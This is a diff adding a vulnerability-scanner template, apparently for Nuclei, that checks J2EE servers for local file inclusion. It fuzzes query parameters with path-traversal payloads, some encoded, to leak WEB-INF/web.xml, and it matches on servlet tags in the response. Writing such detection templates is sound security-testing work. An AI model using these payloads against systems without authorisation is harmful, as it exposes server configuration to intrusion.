@@ -1,0 +1,49 @@
+id: lfi-j2ee
+
+info:
+  name: J2EE LFI
+  author: shelled
+  severity: high
+  description: Looks for J2EE specific LFI vulnerabilities, tries to leak the web.xml file.
+  tags: j2ee,lfi,generic
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      injection:
+      - "../../../../WEB-INF/web.xml"
+      - "../../../WEB-INF/web.xml"
+      - "../../WEB-INF/web.xml"
+      - "%c0%ae/%c0%ae/WEB-INF/web.xml"
+      - "%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml"
+      - "%c0%ae/%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml"
+      - "../../../WEB-INF/web.xml;x="
+      - "../../WEB-INF/web.xml;x="
+      - "../WEB-INF/web.xml;x="
+      - "/WEB-INF/web.xml"
+      - ".//WEB-INF/web.xml"
+      - "../WEB-INF/web.xml"
+      - "%c0%ae/WEB-INF/web.xml"
+
+    fuzzing:
+      - part: query
+        type: replace
+        fuzz:
+          - "{{injection}}"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<servlet-name>"
+          - "</web-app>"
+        condition: and
+
+      - type: status
+        status:
+          - 200
